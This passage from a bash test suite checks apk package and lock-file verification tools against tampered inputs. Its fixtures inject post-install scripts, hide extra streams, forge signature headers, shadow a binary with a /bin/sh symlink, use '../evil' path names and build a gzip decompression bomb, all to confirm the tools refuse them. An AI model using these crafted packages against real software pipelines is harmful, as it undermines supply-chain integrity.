    assert hashlib.sha256(open(p, 'rb').read()).hexdigest() == h, p; n += 1
assert n >= 10, n\""
rm -rf "$work/ev2"; mkdir -p "$work/ev2"; "$LK" evidence --lock "$BL" --archive "$fx/archive" --out "$work/ev2" >/dev/null 2>&1
t "rule 29" "evidence: deterministic (two runs, same list)" bash -c "cmp '$ev/archive-checksums.txt' '$work/ev2/archive-checksums.txt'"
fails "rule 29" "evidence: a lock package missing from the archive fails and names it" 'tzdata' "$LK" evidence --lock "$BL" --archive "$work/arch-m" --out "$work/ev3"

# ---- P4 review round 1 (Opus B1 and R1): control AND data are the apk's identity; only the two exact FIPS lines are exempt ----------
python3 - "$work" "$pr" <<'P'
import sys
sys.path.insert(0, sys.argv[1]); import lib
files = {"usr/bin/fscache": b"binA", "usr/share/x": b"same"}
lib.mkapk(sys.argv[2] + "/ctrl-post-install.apk", "fscache", "0.3.0-r0", files, control={".post-install": b"#!/bin/sh\necho evil\n"})
lib.mkapk(sys.argv[2] + "/ctrl-other-script.apk", "fscache", "0.3.0-r0", files, control={".pre-install": b"#!/bin/sh\necho other\n"})
P
t "rule 22" "apk-tool digest: an apk whose CONTROL section differs (a .post-install script) has a different digest even though its data is the same" bash -c "test \"\$(python3 '$AT' digest '$pr/a.apk')\" != \"\$(python3 '$AT' digest '$pr/ctrl-post-install.apk')\""
t "rule 22" "apk-tool digest: two different control extras give two different digests" bash -c "test \"\$(python3 '$AT' digest '$pr/ctrl-other-script.apk')\" != \"\$(python3 '$AT' digest '$pr/ctrl-post-install.apk')\""
t "rule 22" "apk-tool digest: the signature is excluded (the same apk signed by the release key has the same digest)" bash -c "test \"\$(python3 '$AT' digest '$pr/a.apk')\" = \"\$(python3 '$AT' digest '$pr/b.apk')\""
fails "rule 22" "apk-tool same: control differs (same data) -> exit 1 naming the second apk" 'ctrl-post-install\.apk' python3 "$AT" same "$pr/a.apk" "$pr/ctrl-post-install.apk"

# ---- P4 round 2 (Opus): an apk has at most three streams; the exempt FIPS lines carry exactly the ratified value ------------------------------
python3 - "$work" "$pr" <<'P'
import sys
sys.path.insert(0, sys.argv[1]); import lib
raw = open(sys.argv[2] + "/a.apk", "rb").read(); parts = lib.split(raw)
# signature + control + EVIL control-like stream + data: the evil stream sits between control and data
evil = lib.gz(lib.tarb([(".post-install", b"#!/bin/sh\necho evil\n")]))
open(sys.argv[2] + "/four-streams.apk", "wb").write(parts[0][0] + parts[1][0] + evil + parts[2][0])
P
fails "rule 22" "apk-tool digest: an apk with more than three gzip streams is refused (nothing hides between control and data)" 'stream' python3 "$AT" digest "$pr/four-streams.apk"
fails "rule 22" "apk-tool same: the four-stream apk is refused too, not compared as equal" 'stream' python3 "$AT" same "$pr/a.apk" "$pr/four-streams.apk"

# ---- P5 round 1 (Sonnet R3): verify-archive checks every byte of the apk against the lock, requires ranges, and a non-empty index ----------------------------
python3 - "$work" "$fx" <<'P'
import json, shutil, sys
sys.path.insert(0, sys.argv[1]); import lib
w, fx = sys.argv[1:3]
bl = json.load(open(fx + "/base.lock.json"))
def variant(name, fn):
    d = json.loads(json.dumps(bl))
    for e in d["contents"]["packages"]:
        if e["name"] == "tzdata" and e["architecture"] == "x86_64": fn(e)
    json.dump(d, open("%s/vb-%s.lock.json" % (w, name), "w"))
variant("noctrl", lambda e: e.__setitem__("control", {"range": "", "checksum": ""}))
variant("nodata", lambda e: e.__setitem__("data", {"range": "", "checksum": ""}))
# a data range that stops short of the end of the file: bytes after the last range would pass unchecked
def short(e):
    a, b = [int(x) for x in e["data"]["range"][6:].split("-")]; e["data"]["range"] = "bytes=%d-%d" % (a, b - 5)
    import hashlib, base64
    raw = open(fx + "/archive/x86_64/tzdata-2026a-r0.apk", "rb").read(); e["data"]["checksum"] = "sha256-" + base64.b64encode(hashlib.sha256(raw[a:b - 4]).digest()).decode()
variant("short", short)
# an apk whose .PKGINFO datahash is wrong, with a lock entry that matches its bytes
shutil.rmtree(w + "/arch-dh", ignore_errors=True); shutil.copytree(fx + "/archive", w + "/arch-dh")
sig, ctl, data = lib.mkapk(w + "/arch-dh/x86_64/tzdata-2026a-r0.apk", "tzdata", "2026a-r0", {"usr/share/tzdata/data": b"x"}, signer="wolfi-signing.rsa.pub", datahash="1" * 64)
def baddh(e): e.update(lib.entry("tzdata", "2026a-r0", "x86_64", e["url"], (sig, ctl, data)))
variant("baddh", baddh)
shutil.rmtree(w + "/arch-ei", ignore_errors=True); shutil.copytree(fx + "/archive", w + "/arch-ei"); open(w + "/arch-ei/x86_64/APKINDEX.tar.gz", "wb").close()
shutil.rmtree(w + "/arch-tr", ignore_errors=True); shutil.copytree(fx + "/archive", w + "/arch-tr")
open(w + "/arch-tr/x86_64/tzdata-2026a-r0.apk", "ab").write(b"TRAILING GARBAGE")
P
fails "rule 28" "verify-archive: a lock entry with no control range is refused (an unchecked entry is not accepted)" 'range' "$LK" verify-archive --lock "$work/vb-noctrl.lock.json" --archive "$fx/archive"
fails "rule 28" "verify-archive: a lock entry with no data range is refused" 'range' "$LK" verify-archive --lock "$work/vb-nodata.lock.json" --archive "$fx/archive"
fails "rule 28" "verify-archive: a data range that stops before the end of the file (bytes after it would pass unchecked) is refused" 'end of the file|size|length' "$LK" verify-archive --lock "$work/vb-short.lock.json" --archive "$fx/archive"
fails "rule 28" "verify-archive: bytes appended after the last range of a locked apk are refused" 'end of the file|size|length' "$LK" verify-archive --lock "$BL" --archive "$work/arch-tr"
fails "rule 28" "verify-archive: an apk whose data does not hash to the datahash in its control section is refused" 'datahash' "$LK" verify-archive --lock "$work/vb-baddh.lock.json" --archive "$work/arch-dh"
fails "rule 27" "verify-archive: an EMPTY APKINDEX.tar.gz is refused" 'empty|APKINDEX' "$LK" verify-archive --lock "$BL" --archive "$work/arch-ei"

# ---- P4 round 3 (Sonnet): the apk layout is strict; control + data digest covers the data even when the control lies ---------------------------------
python3 - "$work" "$pr" <<'P'
import sys
sys.path.insert(0, sys.argv[1]); import lib
raw = open(sys.argv[2] + "/unsigned.apk", "rb").read(); parts = lib.split(raw)   # unsigned: control + data
assert len(parts) == 2, len(parts)
evil = lib.gz(lib.tarb([(".post-install", b"#!/bin/sh\necho evil\n")]))
open(sys.argv[2] + "/unsigned-three.apk", "wb").write(parts[0][0] + evil + parts[1][0])        # control | EVIL | data, no signature
signed = lib.split(open(sys.argv[2] + "/a.apk", "rb").read())                                      # signature | control | data
open(sys.argv[2] + "/two-sig.apk", "wb").write(signed[0][0] + signed[0][0] + signed[1][0] + signed[2][0])  # two signatures
open(sys.argv[2] + "/sig-data.apk", "wb").write(signed[0][0] + signed[2][0])                           # signature | data (no control)
# a control whose datahash line says the same thing for two different data sections
files_a = {"usr/bin/fscache": b"binA", "usr/share/x": b"same"}; files_b = {"usr/bin/fscache": b"binB-different", "usr/share/x": b"same"}
lib.mkapk(sys.argv[2] + "/lie-a.apk", "fscache", "0.3.0-r0", files_a, signer=None, datahash="a" * 64)
lib.mkapk(sys.argv[2] + "/lie-b.apk", "fscache", "0.3.0-r0", files_b, signer=None, datahash="a" * 64)
P
fails "rule 22" "apk-tool: an UNSIGNED apk of three streams (control | extra | data) is refused, not compared as if the middle stream did not exist" 'stream|layout|signature' python3 "$AT" same "$pr/unsigned.apk" "$pr/unsigned-three.apk"
fails "rule 22" "apk-tool: ...digest of it is refused too" 'stream|layout|signature' python3 "$AT" digest "$pr/unsigned-three.apk"
fails "rule 22" "apk-tool: two signature streams are refused" 'stream|layout|signature' python3 "$AT" digest "$pr/two-sig.apk"
fails "rule 22" "apk-tool: signature + data with no control is refused" 'stream|layout|control' python3 "$AT" digest "$pr/sig-data.apk"
t "rule 22" "apk-tool digest: two apks whose control sections are identical (same datahash line) but whose DATA differs have different digests (the data is covered, not only the control)" bash -c "test \"\$(python3 '$AT' digest '$pr/lie-a.apk')\" != \"\$(python3 '$AT' digest '$pr/lie-b.apk')\""

# ---- round 3: ASCII digits in ranges; exactly one datahash line in the control section --------------------------------------------------------------
python3 - "$work" "$fx" <<'P'
import json, os, shutil, sys
sys.path.insert(0, sys.argv[1]); import lib
w, fx = sys.argv[1:3]
d = w + "/dh-archive"; shutil.rmtree(d, ignore_errors=True)
lk = json.load(open(fx + "/base.lock.json"))
for e in lk["contents"]["packages"]:
    a = e["architecture"]
    if e["name"] != "tzdata": 
        os.makedirs("%s/%s" % (d, a), exist_ok=True); shutil.copy("%s/archive/%s/%s-%s.apk" % (fx, a, e["name"], e["version"]), "%s/%s/" % (d, a)); continue
    data = lib.gz(lib.tarb([("usr/share/tzdata/data", ("x-" + a).encode())])); dh = lib.hashlib.sha256(data).hexdigest()
    ctrl = lib.gz(lib.tarb([(".PKGINFO", ("pkgname = tzdata\npkgver = %s\ndatahash = %s\ndatahash = %s\n" % (e["version"], dh, "0" * 64)).encode())]))
    os.makedirs("%s/%s" % (d, a), exist_ok=True)
    open("%s/%s/tzdata-%s.apk" % (d, a, e["version"]), "wb").write(ctrl + data)
    ne = lib.entry("tzdata", e["version"], a, e["url"], (b"", ctrl, data)); e.update({k: ne[k] for k in ("control", "data", "checksum", "signature")})
json.dump(lk, open(w + "/dh-dup.lock.json", "w"))
fl = json.load(open(w + "/dh-dup.lock.json"))
for e in fl["contents"]["packages"]:
    e["control"]["range"] = e["control"]["range"].replace("bytes=", "bytes=١")   # an Arabic-Indic digit is not a digit
json.dump(fl, open(w + "/dh-arabic.lock.json", "w"))
P
fails "rule 28" "verify-archive: an apk whose control section has two datahash lines is refused (exactly one is required)" 'datahash' "$LK" verify-archive --lock "$work/dh-dup.lock.json" --archive "$work/dh-archive"
fails "rule 28" "verify-archive: a lock range written with a non-ASCII digit is not a range (refused, names the range)" 'range' "$LK" verify-archive --lock "$work/dh-arabic.lock.json" --archive "$fx/archive"

# ---- snapshot-4 round 4 (Sonnet P2): garbage never gives an empty SBOM; streams must be complete; plain tars only; recipe FIPS lines pinned ----------
python3 - "$work" "$fx" <<'P'
import gzip, io, os, shutil, sys, zlib
sys.path.insert(0, sys.argv[1]); import lib
w, fx = sys.argv[1:3]
sb = fx + "/sbom"
ok = open(sb + "/ok.txt").read()
d = w + "/sbomx"; shutil.rmtree(d, ignore_errors=True); os.makedirs(d)
def put(n, s, mode="w"): open("%s/%s" % (d, n), mode).write(s)
put("empty.txt", "")
put("garbage.txt", "garbage\nnot a go binary\n")
put("spaces.txt", "/usr/bin/fscache: go1.27.2\n  path  x\n  mod  github.com/fosterstack/cache  v0.3.0\n  dep  github.com/example/x  v1.0.0\n")
put("nover.txt", ok.replace("\tdep\tgithub.com/example/x\tv1.0.0\n", "\tdep\tgithub.com/example/x\n"))
put("crlf.txt", ok.replace("\n", "\r\n"), "w")
open(d + "/bom.txt", "wb").write(b"\xef\xbb\xbf" + ok.encode())
put("nohead.txt", "\tdep\tgithub.com/example/x\tv1.0.0\n")
put("nopath.txt", "/usr/bin/fscache: go1.27.2\n\tdep\tgithub.com/example/x\tv1.0.0\n")
put("unknown.txt", ok + "\tweird\tthing\n")
put("stray.txt", ok + "some stray line\n")
put("stdlib.txt", "/usr/bin/fscache: go1.27.2\n\tpath\tgithub.com/fosterstack/cache/cmd/fscache\n\tmod\tgithub.com/fosterstack/cache\tv0.3.0\n\tbuild\t-trimpath=true\n")
# streams without their trailer, and a gzip(tar) inside the data section
ap = lib.mkapk
sig, ctrl, data = ap(w + "/sbomx/full.apk", "fscache", "0.3.0-r0", {"usr/bin/fscache": b"bin"})
open(d + "/notrailer.apk", "wb").write(sig + ctrl + data[:-8])                       # data stream cut before its CRC/size trailer
inner = lib.gz(lib.tarb([("usr/bin/fscache", b"bin")]))
data2 = lib.gz(inner)                                                                   # gzip(tar-in-gzip): the outer tar is itself compressed
ctrl2 = lib.gz(lib.tarb([(".PKGINFO", ("pkgname = f\npkgver = 1\ndatahash = %s\n" % lib.hashlib.sha256(data2).hexdigest()).encode())]))
open(d + "/doublegz.apk", "wb").write(ctrl2 + data2)
two = lib.gz(lib.tarb([(".SIGN.RSA256.a.rsa.pub", b"s1"), (".SIGN.RSA256.b.rsa.pub", b"s2")]))
open(d + "/twosigs.apk", "wb").write(two + ctrl + data)
P
sx="$work/sbomx"
for n in empty garbage spaces nover crlf bom nohead nopath unknown stray; do
  fails "rule 20" "go-module-sbom: the input '$n' is refused (exit 2), never an empty SBOM" 'go-module-sbom' python3 "$GS" "${gsa[@]}" --buildinfo "$sx/$n.txt" --out "$work/sx-$n.json"
  t "rule 20" "...$n: exit code 2 and no SBOM file written" bash -c "python3 '$GS' ${gsa[*]} --buildinfo '$sx/$n.txt' --out '$work/sx2-$n.json' >/dev/null 2>&1; test \$? = 2 && test ! -e '$work/sx2-$n.json'"
done
t "rule 20" "go-module-sbom: a stdlib-only binary (no dependencies) gives an explicit SBOM with zero module packages" \
  bash -c "python3 '$GS' ${gsa[*]} --buildinfo '$sx/stdlib.txt' --out '$work/sx-stdlib.json' \
    && python3 -c \"import json,sys; d=json.load(open('$work/sx-stdlib.json')); \
    assert [p for p in d['packages'] if $NONROOT]==[], d\""
fails "rule 14" "apk-tool: a gzip stream missing its CRC/size trailer is refused (not accepted by digest)" 'trailer|complete|truncated|eof' python3 "$AT" digest "$sx/notrailer.apk"
fails "rule 14" "apk-tool: ...and by signer" 'trailer|complete|truncated|eof' python3 "$AT" signer "$sx/notrailer.apk"
fails "rule 14" "apk-tool: a data section that is itself gzip(tar) is not read as a tar (binary-check refuses)" 'tar|malformed|compress|plain|header' python3 "$AT" binary-check "$sx/doublegz.apk" "$pr/binA"
fails "rule 22" "apk-tool: an apk with two signature members is refused (which one counts?)" 'signature' python3 "$AT" signer "$sx/twosigs.apk"
# apko-lock: a lock entry with missing keys is a named exit 2, not a traceback
python3 - "$work" "$BL" <<'P'
import json, sys
w, bl = sys.argv[1:3]
d = json.load(open(bl)); del d["contents"]["packages"][0]["control"]
json.dump(d, open(w + "/lock-nokey.json", "w"))
d = json.load(open(bl)); del d["contents"]["packages"][1]["name"]
json.dump(d, open(w + "/lock-noname.json", "w"))
P
for n in nokey noname; do
  t "rule 28" "apko-lock: a lock entry with a missing key ($n) exits 2 with a named message and no traceback (verify-archive)" bash -c "'$LK' verify-archive --lock '$work/lock-$n.json' --archive '$fx/archive' >'$work/lk.out' 2>&1; test \$? = 2 && ! grep -q Traceback '$work/lk.out' && grep -qi 'malformed\|missing' '$work/lk.out'"
  t "rule 28" "...compare ($n)" bash -c "'$LK' compare '$work/lock-$n.json' '$FL' --apk fscache >'$work/lk.out' 2>&1; test \$? = 2 && ! grep -q Traceback '$work/lk.out'"
done

# ---- snapshot-4 round 4 (Opus P2): the signature decision is the first tar header; recipes are straight-line scripts; arch sets and our apk entries are exact -------------
python3 - "$work" "$fx" "$BL" <<'P'
import json, os, shutil, sys
sys.path.insert(0, sys.argv[1]); import lib
w, fx, bl = sys.argv[1:4]
d = w + "/r4"; shutil.rmtree(d, ignore_errors=True); os.makedirs(d)
sig, ctrl, data = lib.mkapk(d + "/honest.apk", "fscache", "0.3.0-r0", {"usr/bin/fscache": b"bin"}, signer=None)
# stream 0 holds .PKGINFO (depend = evil), a script AND a .SIGN member: apko/melange read it as the control (first header), so it is not a signature
evil = lib.gz(lib.tarb([(".PKGINFO", b"pkgname = fscache\npkgver = 0.3.0-r0\ndepend = evil-pkg\n"), (".post-install", b"#!/bin/sh\n"), (".SIGN.RSA256.assembly.rsa.pub", b"x")]))
open(d + "/mixed.apk", "wb").write(evil + ctrl + data)
extra = lib.gz(lib.tarb([(".SIGN.RSA256.assembly.rsa.pub", b"x"), ("extra-member", b"y")]))
open(d + "/sigextra.apk", "wb").write(extra + ctrl + data)
ctrl_with_sign = lib.gz(lib.tarb([(".PKGINFO", b"pkgname = fscache\n"), (".SIGN.RSA256.k.rsa.pub", b"x")]))
open(d + "/ctrlsign.apk", "wb").write(ctrl_with_sign + data)
# apko-lock fixtures
lk = json.load(open(bl))
def w_(name, doc): json.dump(doc, open("%s/%s" % (d, name), "w"))
x = json.loads(json.dumps(lk))
x["contents"]["packages"] = [e for e in x["contents"]["packages"] if not (e["name"] == "wolfi-baselayout" and e["architecture"] == "aarch64")]
w_("arch-missing-pkg.json", x)
x = json.loads(json.dumps(lk)); x["contents"]["packages"] = [e for e in x["contents"]["packages"] if e["architecture"] == "x86_64"]; w_("arch-one.json", x)
x = json.loads(json.dumps(lk)); e0 = dict(x["contents"]["packages"][0]); e0["architecture"] = "riscv64"; x["contents"]["packages"].append(e0); w_("arch-riscv.json", x)
x = json.loads(json.dumps(lk)); x["contents"]["packages"][0]["name"] = "../evil"; w_("name-dots.json", x)
x = json.loads(json.dumps(lk)); x["contents"]["packages"][0]["version"] = "1/../x"; w_("ver-slash.json", x)
# full lock with extras for our apk
full = json.load(open(fx + "/full.lock.json"))
x = json.loads(json.dumps(full)); ours = [e for e in x["contents"]["packages"] if e["name"] == "fscache"]
dup = dict(ours[0]); dup["version"] = "0.0.1-r0"; dup["control"] = {"range": ours[0]["control"]["range"], "checksum": "sha1-AAAA"}; x["contents"]["packages"].append(dup); w_("full-dupe-ours.json", x)
x = json.loads(json.dumps(full)); dup2 = json.loads(json.dumps(ours[0])); dup2["data"] = {"range": ours[0]["data"]["range"], "checksum": "sha256-BBBB"}; x["contents"]["packages"].append(dup2); w_("full-dupe-same-version.json", x)
x = json.loads(json.dumps(full)); r = dict(ours[0]); r["architecture"] = "riscv64"; x["contents"]["packages"].append(r); w_("full-riscv-ours.json", x)
# an apk with a gap between the control and the data section, hashes valid for the slices the lock names
c2 = lib.gz(lib.tarb([(".PKGINFO", b"pkgname = gap\npkgver = 1-r0\ndatahash = %s\n" % lib.hashlib.sha256(data).hexdigest().encode())]))
os.makedirs(d + "/gaparch/x86_64", exist_ok=True)
open(d + "/gaparch/x86_64/gap-1-r0.apk", "wb").write(c2 + b"JUNK" + data)
ent = lib.entry("gap", "1-r0", "x86_64", "/work/archive/x86_64/gap-1-r0.apk", (b"", c2, data))
ent["data"]["range"] = "bytes=%d-%d" % (len(c2) + 4, len(c2) + 4 + len(data) - 1)
g = json.loads(json.dumps(lk)); g["contents"]["packages"] = [ent]; w_("gap.lock.json", g)
os.makedirs(d + "/gaparch/aarch64", exist_ok=True)
P
r4="$work/r4"
fails "rule 22" "apk-tool: stream 0 that holds a .PKGINFO and a .SIGN member is read as the CONTROL (first header), so a 'signed' mixed apk is not equal to the honest one" 'signature|control|stream' python3 "$AT" same "$r4/honest.apk" "$r4/mixed.apk"
fails "rule 22" "apk-tool: a signature stream with any member besides the one .SIGN member is refused" 'signature' python3 "$AT" digest "$r4/sigextra.apk"
fails "rule 22" "apk-tool: a control section that also holds a .SIGN member is refused" 'signature|\.SIGN' python3 "$AT" digest "$r4/ctrlsign.apk"
fails "rule 33" "arch-check: a package present on one architecture only is refused" 'wolfi-baselayout' "$LK" arch-check "$r4/arch-missing-pkg.json"
fails "rule 33" "arch-check: a lock with only x86_64 is refused (the set must be exactly x86_64 and aarch64)" 'architect' "$LK" arch-check "$r4/arch-one.json"
fails "rule 33" "arch-check: a third architecture is refused" 'architect|riscv64' "$LK" arch-check "$r4/arch-riscv.json"
fails "rule 37" "compare: a second entry for our apk (another version, other checksums) is refused" 'fscache' "$LK" compare "$BL" "$r4/full-dupe-ours.json" --apk fscache
fails "rule 37" "compare: two entries for our apk at the SAME version (other checksums) on one architecture are refused: exactly one" 'exactly one' "$LK" compare "$BL" "$r4/full-dupe-same-version.json" --apk fscache
fails "rule 37" "compare: our apk for an architecture the base lock does not have is refused" 'riscv64|architect' "$LK" compare "$BL" "$r4/full-riscv-ours.json" --apk fscache
fails "rule 28" "verify-archive: a gap between the control and the data section (the checksums of the named slices are right) is refused: ranges must be contiguous" 'contiguous' "$LK" verify-archive --lock "$r4/gap.lock.json" --archive "$r4/gaparch"
fails "rule 28" "apko-lock: a package name with '..' is refused as a lock entry (exit 2) before any path is built" 'malformed|invalid' "$LK" verify-archive --lock "$r4/name-dots.json" --archive "$fx/archive"
fails "rule 28" "apko-lock: a version with a slash is refused as a lock entry" 'malformed|invalid' "$LK" verify-archive --lock "$r4/ver-slash.json" --archive "$fx/archive"


# ---- snapshot-5 round 5 (Sonnet/Opus P2): the signature decision uses the RAW first header; every header counts; no shadowing; a total inflate cap ----------------
python3 - "$work" "$fx" <<'P'
import gzip, io, os, shutil, sys, tarfile, zlib
sys.path.insert(0, sys.argv[1]); import lib
w, fx = sys.argv[1:3]
d = w + "/r5a"; shutil.rmtree(d, ignore_errors=True); os.makedirs(d)
sig, ctrl, data = lib.mkapk(d + "/honest.apk", "fscache", "0.3.0-r0", {"usr/bin/fscache": b"bin"}, signer=None)
def tar(entries, fmt=tarfile.GNU_FORMAT, pax=None):
    b = io.BytesIO()
    with tarfile.open(fileobj=b, mode="w", format=fmt, pax_headers=pax) as t:
        for kind, n, c in entries:
            i = tarfile.TarInfo(n); i.mtime = 0
            if kind == "file": i.size = len(c); t.addfile(i, io.BytesIO(c))
            elif kind == "sym": i.type = tarfile.SYMTYPE; i.linkname = c; t.addfile(i)
    return lib.gz(b.getvalue())
def apk(name, *parts): open("%s/%s.apk" % (d, name), "wb").write(b"".join(parts))
apk("dotslash", tar([("file", "./.SIGN.RSA256.evil.rsa.pub", b"s")]), ctrl, data)
apk("pax", tar([("file", ".SIGN.RSA256.evil.rsa.pub", b"s")], fmt=tarfile.PAX_FORMAT, pax={"comment": "x"}), ctrl, data)
good_sig = tar([("file", ".SIGN.RSA256.assembly.rsa.pub", b"s")])
apk("sigctrl", good_sig, tar([("file", ".PKGINFO", b"pkgname = f\n"), ("file", ".SIGN.RSA256.evil.rsa.pub", b"x")]), data)
apk("sigdata", good_sig, ctrl, tar([("file", "usr/bin/fscache", b"bin"), ("file", ".SIGN.RSA256.evil.rsa.pub", b"x")]))
apk("sigsym", tar([("file", ".SIGN.RSA256.assembly.rsa.pub", b"s"), ("sym", "link", "x")]), ctrl, data)
apk("sigdup", tar([("file", ".SIGN.RSA256.assembly.rsa.pub", b"s"), ("file", ".SIGN.RSA256.assembly.rsa.pub", b"t")]), ctrl, data)
apk("shadow", ctrl, tar([("file", "usr/bin/fscache", b"bin"), ("sym", "usr/bin/fscache", "/bin/sh")]))
apk("dupname", ctrl, tar([("file", "usr/bin/fscache", b"bin"), ("file", "./usr/bin/fscache", b"other")]))
# a section that inflates to more than the cap (1.1 GiB of zeros, about 1 MB compressed)
co = zlib.compressobj(9, zlib.DEFLATED, 31); chunk = b"\0" * (64 << 20); out = []
for _ in range(18): out.append(co.compress(chunk))
out.append(co.flush())
open(d + "/bomb.apk", "wb").write(b"".join(out) + ctrl + data)
P
r5a="$work/r5a"
fails "rule 22" "apk-tool: a first header named ./.SIGN.* is not a signature to apko, so it is refused (signer must not print its key name)" '\./|signature|\.SIGN' python3 "$AT" signer "$r5a/dotslash.apk"
fails "rule 22" "apk-tool: a stream that starts with a PAX header (apko reads it as the first header, Python skips it) is refused" 'PAX|extended|first' python3 "$AT" signer "$r5a/pax.apk"
fails "rule 22" "apk-tool: a .SIGN member in the CONTROL section of a signed apk is refused" 'signature|\.SIGN' python3 "$AT" digest "$r5a/sigctrl.apk"
fails "rule 22" "apk-tool: a .SIGN member in the DATA section is refused" 'signature|\.SIGN' python3 "$AT" digest "$r5a/sigdata.apk"
fails "rule 22" "apk-tool: a signature stream with a symlink entry besides the .SIGN file is refused (every header counts)" 'signature|link' python3 "$AT" signer "$r5a/sigsym.apk"
fails "rule 22" "apk-tool: a signature stream with the same .SIGN name twice is refused" 'signature|twice|duplicate' python3 "$AT" signer "$r5a/sigdup.apk"
fails "rule 14" "apk-tool: a regular usr/bin/fscache followed by a symlink of the same name is refused (a later entry shadows)" 'twice|duplicate|shadow' python3 "$AT" binary-check "$r5a/shadow.apk" "$pr/binA"
fails "rule 14" "apk-tool: the same name twice (once with a leading ./) is refused" 'twice|duplicate|shadow' python3 "$AT" cat "$r5a/dupname.apk" usr/bin/fscache
fails "rule 14" "apk-tool: a section that inflates beyond the cap is refused by name of the limit" 'MiB|too large|more than' python3 "$AT" digest "$r5a/bomb.apk"

# exact exit codes of arch-check: 1 = a package differs (AC8), 2 = bad input (a lock that does not cover exactly the two architectures)
rcis() { local want=$1; shift; "$@" >/dev/null 2>&1; [ $? = "$want" ]; }
t "rule 33" "arch-check: a package present on one architecture only exits 1 (it differs)" rcis 1 "$LK" arch-check "$r4/arch-missing-pkg.json"
t "rule 33" "arch-check: a package whose version differs between architectures exits 1" rcis 1 "$LK" arch-check "$work/b-arch.json"
t "rule 33" "arch-check: a lock with only x86_64 exits 2 (bad input)" rcis 2 "$LK" arch-check "$r4/arch-one.json"
t "rule 33" "arch-check: a third architecture exits 2" rcis 2 "$LK" arch-check "$r4/arch-riscv.json"

# go-module-sbom: a repeated dependency, a dep after a build line, extra fields and a file cut after mod are refused
python3 - "$work" "$fx" <<'P'
import os, shutil, sys
w, fx = sys.argv[1:3]
ok = open(fx + "/sbom/ok.txt").read(); d = w + "/sbomy"; shutil.rmtree(d, ignore_errors=True); os.makedirs(d)
def put(n, s): open("%s/%s" % (d, n), "w").write(s)
put("dupdep.txt", ok.replace("\tdep\tgolang.org/x/sys\tv0.30.0\n", "\tdep\tgolang.org/x/sys\tv0.30.0\n\tdep\tgolang.org/x/sys\tv0.31.0\n"))
put("depafterbuild.txt", ok + "\tdep\texample.org/evil\tv6.6.6\n")
put("extrafield.txt", ok.replace("\tdep\tgithub.com/example/x\tv1.0.0\n", "\tdep\tgithub.com/example/x\tv1.0.0\tz\tq\n"))
put("cutaftermod.txt", "/usr/bin/fscache: go1.27.2\n\tpath\tgithub.com/fosterstack/cache/cmd/fscache\n\tmod\tgithub.com/fosterstack/cache\tv0.3.0\n")
P
for n in dupdep depafterbuild extrafield cutaftermod; do
  fails "rule 20" "go-module-sbom: '$n' is refused (exit 2)" 'go-module-sbom' python3 "$GS" "${gsa[@]}" --buildinfo "$work/sbomy/$n.txt" --out "$work/sy-$n.json"
done

# ---- snapshot-6 round 6 (Opus P2/P4, Sonnet P2): tags, templates, environments, a second build, PATH, identical FIPS-named recipes -----------------------------
r6="$work/r6"

# ---- snapshot-6 round 6 (Sonnet/Opus P2): the first header is read the way Go reads it; names are canonical; real vendored go version -m output --------------------------
python3 - "$work" "$fx" <<'P'
import io, os, shutil, sys, tarfile
sys.path.insert(0, sys.argv[1]); import lib
w, fx = sys.argv[1:3]
d = w + "/r6a"; shutil.rmtree(d, ignore_errors=True); os.makedirs(d)
sig, ctrl, data = lib.mkapk(d + "/orig.apk", "fscache", "0.3.0-r0", {"usr/bin/fscache": b"bin"}, signer=None)
def tar(entries, fmt=tarfile.GNU_FORMAT):
    b = io.BytesIO()
    with tarfile.open(fileobj=b, mode="w", format=fmt) as t:
        for kind, n, c in entries:
            i = tarfile.TarInfo(n); i.mtime = 0
            if kind == "file": i.size = len(c); t.addfile(i, io.BytesIO(c))
            elif kind == "longsym": i.type = tarfile.SYMTYPE; i.linkname = c; t.addfile(i)
    return lib.gz(b.getvalue())
def apk(name, *parts): open("%s/%s.apk" % (d, name), "wb").write(b"".join(parts))
# ustar prefix: Go joins prefix and name, so this first header is NOT a .SIGN entry to apko
apk("prefix", tar([("file", "a" * 120 + "/.SIGN.RSA.k", b"s")], fmt=tarfile.USTAR_FORMAT), ctrl, data)
# a GNU long-link ('K') first block: Go resolves it and reads the next header
apk("ktrick", tar([("longsym", ".SIGN.RSA256.release.rsa.pub", "x" * 300)]), ctrl, data)
good = lib.gz  # noqa
for n, spell in (("slashes", "usr/bin//fscache"), ("dotdir", "usr/./bin/fscache"), ("dotslash2", "./usr/bin//fscache"), ("dotdot", "usr/bin/../bin/fscache")):
    apk("alias-" + n, ctrl, tar([("file", "usr/bin/fscache", b"GOOD"), ("file", spell, b"EVIL")]))
# a real vendored-build go version -m: the dependency line ends with an EMPTY sum field
ok = open(fx + "/sbom/ok.txt").read()
open(d + "/emptysum.txt", "w").write(ok.replace("\tdep\tgithub.com/example/x\tv1.0.0\n", "\tdep\tgithub.com/example/x\tv1.0.0\t\n"))
open(d + "/h1sum.txt", "w").write(ok.replace("\tdep\tgithub.com/example/x\tv1.0.0\n", "\tdep\tgithub.com/example/x\tv1.0.0\th1:abc=\n"))
P
r6a="$work/r6a"
fails "rule 22" "apk-tool: a first header with a ustar PREFIX is refused (Go joins prefix and name; the stream is not a signature to apko)" 'prefix|plain|header' python3 "$AT" same "$r6a/orig.apk" "$r6a/prefix.apk"
fails "rule 22" "apk-tool: a first block of type K (GNU long link) is refused" 'plain|header|type' python3 "$AT" same "$r6a/orig.apk" "$r6a/ktrick.apk"
for n in slashes dotdir dotslash2 dotdot; do
  fails "rule 14" "apk-tool: the entry spelled as '$n' that aliases usr/bin/fscache is refused (names must be canonical)" 'canonical|twice|duplicate' python3 "$AT" binary-check "$r6a/alias-$n.apk" "$pr/binA"
done
t "rule 20" "go-module-sbom: a dep line with an EMPTY sum field (what a -mod=vendor build prints) is accepted" \
  bash -c "python3 '$GS' ${gsa[*]} --buildinfo '$r6a/emptysum.txt' --out '$work/es.json' \
    && python3 -c \"import json; d=json.load(open('$work/es.json')); \
    assert [p['name'] for p in d['packages'] if $NONROOT]==['github.com/example/x', 'golang.org/x/sys'], d\""
t "rule 20" "go-module-sbom: a dep line with an h1: sum is accepted too" python3 "$GS" "${gsa[@]}" --buildinfo "$r6a/h1sum.txt" --out "$work/hs.json"

# inputs-manifest: an apk whose build environment lists no packages is refused (not a vacuous pass)
python3 - "$work" <<'P'
import sys, yaml
sys.path.insert(0, sys.argv[1]); import lib
w = sys.argv[1]
